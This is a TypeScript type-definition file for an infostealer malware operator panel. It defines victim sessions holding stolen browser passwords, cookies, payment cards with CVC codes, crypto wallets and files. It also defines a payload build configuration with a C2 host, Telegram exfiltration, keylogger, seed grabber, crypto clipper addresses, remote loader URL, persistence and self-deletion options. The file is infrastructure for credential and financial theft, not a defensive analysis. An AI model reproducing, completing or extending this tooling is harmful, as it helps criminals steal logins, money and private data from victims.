export interface LoginRequest { username: string; password: string }
export interface LoginResponse { token: string; expires_at: string }

export interface CountStats { total: number; today?: number; yesterday?: number; change?: number }
export interface SessionStats { total: number; today: number; yesterday: number; change: number }
export interface DuplicateStats { hwid: number; ip: number }
export interface QualityStats { valid: number; total: number; percentage: number }

export interface StatsResponse {
  sessions: SessionStats
  passwords: CountStats
  cookies: CountStats
  cards: CountStats
  wallets: CountStats
  duplicates: DuplicateStats
  quality: QualityStats
  countries: number
  geo: Array<{ country_code: string; count: number }>
  browsers: Array<{ browser: string; count: number }>
  os_distribution: Array<{ os: string; count: number }>
  timeline: Array<{ date: string; count: number }>
  top_domains: Array<{ domain: string; count: number }>
}

export interface SystemHealth {
  status: string
  goroutines: number
  mem_alloc_mb: number
  mem_sys_mb: number
  mem_heap_mb: number
  gc_cycles: number
  go_version: string
}

export interface Session {
  id: string
  build_id?: string
  hwid?: string
  os?: string
  username?: string
  ip?: string
  country_code?: string
  created_at: string
}

export interface SessionListItem extends Session {
  passwords_count?: number
  cookies_count?: number
  cards_count?: number
  wallets_count?: number
  files_count?: number
  viewed?: boolean
  browser?: string
}

export interface SessionDetail extends SessionListItem {
  passwords: Password[]
  cookies: Cookie[]
  cards: Card[]
  wallets: WalletResponse[]
  files: StolenFile[]
  system_info?: SystemInfo
}

export interface Password {
  id: string; session_id: string; url?: string; username?: string; password_value?: string; browser?: string
}

export interface Cookie {
  id: string; session_id: string; domain?: string; name?: string; value?: string; path?: string
}

export interface Card {
  id: string; session_id: string; number?: string; exp_month?: string; exp_year?: string; holder?: string; cvc?: string
}

export interface WalletResponse { id: string; name: string; path: string; icon?: string }

export interface StolenFile { id: string; filename: string; size: number }

export interface SystemInfo {
  cpu?: string; gpu?: string; ram?: string; os?: string; screen?: string
  hostname?: string; local_ip?: string; mac?: string; public_ip?: string; hwid?: string; uptime?: string
}

export interface WSMessage { type: string; data?: unknown }

export interface PaginatedResponse<T> { items: T[]; total: number; page: number; limit: number; pages: number }

export interface SessionPage { sessions: SessionListItem[]; items?: SessionListItem[]; total: number; page: number; limit: number; pages: number }

export interface BuildConfig {
  c2_host: string; c2_port: number; telegram_token: string; telegram_chat_id: string
  enable_persistence: boolean; enable_screenshot: boolean; enable_grabber: boolean; include_decryptor: boolean; build_tag: string
}

export interface BuildRecord {
  id: string
  file_size: number
  sha256: string
  build_tag: string
  download_count: number
  created_at: string
}
export interface BuildConfig {
  build_name: string; build_tag: string
  icon_data?: number[]; manifest_xml?: number[]
  c2_host: string; c2_port: number; c2_token: string
  telegram_token: string; telegram_chat_id: string
  anti_duplicate: { ban_hwid: boolean; ban_ip: boolean; ban_timeout_h: number }
  proxy_gate: { enabled: boolean; type: string; source_id: string }
  modules: {
    chromium: { enabled: boolean; passwords: boolean; cookies: boolean; cards: boolean; history: boolean; autofill: boolean; bookmarks: boolean; google_tokens: boolean; cdp_grab: boolean; raw_export: boolean; kill_browsers: boolean }
    firefox: { enabled: boolean; passwords: boolean; cookies: boolean; history: boolean }
    wallets: boolean; gaming: boolean; vpn: boolean; twofa: boolean; passman: boolean
    messengers: { discord: boolean; telegram: boolean; telegram_clients: string[]; signal: boolean; whatsapp: boolean; skype: boolean; viber: boolean; element: boolean; session: boolean; tox: boolean; icq: boolean; pidgin: boolean; outlook: boolean }
    system: { system_info: boolean; wifi: boolean; screenshot: boolean; keylogger: boolean; seed_grabber: boolean; clipboard: boolean }
    clipper: { enabled: boolean; coins: string[]; btc_addr: string; eth_addr: string; trx_addr: string; xmr_addr: string; sol_addr: string; ton_addr: string }
    grabber: { enabled: boolean; extensions: string[]; max_size_mb: number; max_depth: number; paths: string[] }
    loader: { enabled: boolean; url: string }
  }
  persistence: boolean; self_delete: boolean
  startup_delay_ms: number
  socks5_host: string; socks5_port: number
  include_decryptor: boolean
}

export interface BuildResponse { id: string; download_url: string; file_size: number; sha256: string }

export interface ApiError { status: number; error: string; message?: string }

export interface Note { id: string; session_id: string; content: string; created_by: string; created_at: string }
